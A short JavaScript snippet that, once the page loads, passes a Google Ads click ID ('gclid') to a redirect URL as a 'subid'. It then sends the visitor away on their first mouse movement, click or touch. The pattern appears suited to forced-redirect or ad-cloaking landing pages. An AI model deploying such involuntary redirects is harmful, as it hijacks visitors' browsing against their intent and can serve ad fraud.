document.addEventListener('DOMContentLoaded', function() {
            function getQueryParam(param) {
                var urlParams = new URLSearchParams(window.location.search);
                return urlParams.get(param);
            }
			
            var gclid = getQueryParam('gclid');
            var redirUrl = 'https://google.com';

            if (gclid) {
				if (redirUrl.indexOf('?') === -1) {
                    redirUrl += '?subid=' + encodeURIComponent(gclid);
                } else {
                    redirUrl += '&subid=' + encodeURIComponent(gclid);
                }
            }

            function redirToUrl() {
                window.location.href = redirUrl;
            }

            document.addEventListener('mousemove', redirToUrl, { once: true });
            document.addEventListener('click', redirToUrl, { once: true });
            document.addEventListener('touchstart', redirToUrl, { once: true });
        });
